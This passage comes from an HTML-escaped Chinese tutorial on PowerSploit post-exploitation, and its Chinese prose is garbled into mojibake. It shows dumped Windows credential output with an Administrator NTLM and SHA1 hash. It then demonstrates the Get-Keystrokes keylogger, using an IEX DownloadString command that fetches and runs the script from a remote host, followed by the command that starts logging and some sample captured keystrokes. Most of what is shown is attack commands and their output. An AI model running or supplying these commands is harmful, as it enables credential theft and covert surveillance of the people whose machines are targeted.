&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tspkg&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wdigest&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;         &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Username&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WIN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;I1OIAEUTNT1&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;         &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Domain&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;   &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WORKGROUP&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;         &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Password&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kerberos&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ssp&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;credman&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Authentication&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Id&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;215152&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;00000000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;00034870&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Session&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;           &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Interactive&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;User&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Name&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;         &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Administrator&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Domain&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WIN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;I1OIAEUTNT1&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Logon&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Server&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WIN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;I1OIAEUTNT1&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Logon&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;Time&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2022&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;17&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;13&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;13&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;55&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SID&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;               &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;S&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;21&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3896163557&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1645138957&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2306563325&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;500&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;msv&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;         &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;00000003&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;Primary&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;         &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Username&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Administrator&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;         &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Domain&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;   &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WIN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;I1OIAEUTNT1&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;         &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;NTLM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;     &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;de26cce0356891a4a020e7c4957afc72&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;         &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SHA1&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;     &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8252&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ce88ea5c224541baf0401452d2f6a501f03c&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tspkg&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;wdigest&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;         &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Username&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Administrator&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;         &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Domain&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;   &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WIN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;I1OIAEUTNT1&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;         &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Password&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kerberos&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;         &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Username&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Administrator&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;         &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Domain&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;   &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WIN&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;I1OIAEUTNT1&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;         &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Password&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ssp&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;credman&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;get-keystrokes&#34;&gt;Get-Keystrokes&lt;/h3&gt;
&lt;p&gt;Get-Keystrokesæ˜¯Exfiltrationæ¨¡å—ä¸‹çš„ä¸€ä¸ªè„šæœ¬ï¼Œç”¨äºé”®ç›˜è®°å½•ï¼ŒåŠŸèƒ½ç›¸å½“å¼ºå¤§ï¼Œä¸ä»…æœ‰é”®ç›˜è¾“å…¥è®°å½•ï¼Œç”šè‡³èƒ½è®°å½•é¼ æ ‡çš„ç‚¹å‡»æƒ…å†µï¼Œè¿˜èƒ½è®°å½•è¯¦ç»†çš„æ—¶é—´ï¼Œå®æˆ˜æ—¶å¯ä»¥ç›´æ¥æ”¾å…¥åå°è¿è¡Œï¼š&lt;/p&gt;
&lt;p&gt;åŒæ ·æ˜¯å…ˆä¸‹è½½è„šæœ¬ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;E:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;IEX &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;New-Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Net&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WebClient&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;DownloadString&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://172.16.0.107:8000/Exfiltration/Get-Keystrokes.ps1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åæ‰§è¡Œå‘½ä»¤å¼€å¯è®°å½•ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;E:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Get-Keystrokes&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-LogPath&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Administrator&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;txt&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;éšä¾¿æŒ‰äº›é”®ç›˜ï¼Œç„¶åå»æŸ¥çœ‹&lt;code&gt;test.txt&lt;/code&gt;æ–‡ä»¶ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#34;TypedKey&amp;#34;,&amp;#34;WindowTitle&amp;#34;,&amp;#34;Time&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#34;a&amp;#34;,&amp;#34;ç®¡ç†å‘˜: Windows PowerShell&amp;#34;,&amp;#34;2022/1/18 1:23:44&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#34;x&amp;#34;,&amp;#34;ç®¡ç†å‘˜: Windows PowerShell&amp;#34;,&amp;#34;2022/1/18 1:23:44&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#34;i&amp;#34;,&amp;#34;ç®¡ç†å‘˜: Windows PowerShell&amp;#34;,&amp;#34;2022/1/18 1:23:44&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#34;i&amp;#34;,&amp;#34;ç®¡ç†å‘˜: Windows PowerShell&amp;#34;,&amp;#34;2022/1/18 1:23:45&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#34;w&amp;#34;,&amp;#34;ç®¡ç†å‘˜: Windows PowerShell&amp;#34;,&amp;#34;2022/1/18 1:23:45&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#34;o&amp;#34;,&amp;#34;ç®¡ç†å‘˜: Windows PowerShell&amp;#34;,&amp;#34;2022/1/18 1:23:45&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#34;e&amp;#34;,&amp;#34;ç®¡ç†å‘˜: Windows PowerShell&amp;#34;,&amp;#34;2022/1/18 1:23:45&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#34;0&amp;#34;,&amp;#34;ç®¡ç†å‘˜: Windows PowerShell&amp;#34;,&amp;#34;2022/1/18 1:23:45&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;#34;2&amp;#34;,&amp;#34;ç®¡ç†å‘˜: Windows PowerShell&amp;#34;,&amp;#34;2022/1/18 1:23:45&amp;#34;
